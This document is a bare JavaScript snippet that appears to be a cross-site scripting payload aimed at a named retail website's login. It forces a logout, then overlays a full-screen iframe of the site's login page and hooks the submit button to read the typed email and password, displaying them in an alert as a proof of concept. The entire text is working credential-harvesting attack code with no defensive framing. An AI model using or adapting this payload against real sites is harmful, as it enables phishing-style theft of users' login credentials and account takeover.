fetch("/login/logout", {
  method: "GET",
  body: undefined,
  referrer: "",
  redirect:"manual"
});
window.setTimeout(()=>{
let iframe=document.createElement("iframe");
iframe.src="https://www.puritan.com/login"
iframe.style="position: fixed; top:0; left:0; bottom:0; right:0; width: 100%; height:100%; border:none; margin:0; padding:0; overflow: hidden; z-index:999999;";
document.body.appendChild(iframe)
iframe.contentWindow.addEventListener("DOMContentLoaded", () => {
let loginbutton=iframe.contentWindow.document.getElementById("login_submit");
loginbutton.onclick=()=>
{
let email=iframe.contentWindow.document.getElementById("Email").value;
let pass=iframe.contentWindow.document.getElementById("Password").value;
alert(`${email} : ${pass}`)
}

})
},3000)
